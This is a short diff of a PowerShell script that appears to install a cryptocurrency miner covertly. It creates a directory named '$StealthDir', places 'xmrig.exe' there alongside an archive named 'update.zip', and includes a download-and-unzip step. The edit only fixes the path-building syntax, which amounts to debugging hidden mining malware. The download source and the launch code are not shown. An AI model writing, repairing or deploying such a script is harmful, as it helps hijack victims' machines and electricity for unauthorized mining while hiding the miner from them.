@@ -11,8 +11,8 @@ if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
 }
 
-$ZipPath = Path.Combine($StealthDir, "update.zip")
-$ExePath = Path.Combine($StealthDir, "xmrig.exe")
+$ZipPath = Join-Path $StealthDir "update.zip"
+$ExePath = Join-Path $StealthDir "xmrig.exe"
 
 try {
     # Download and Unzip if not already there
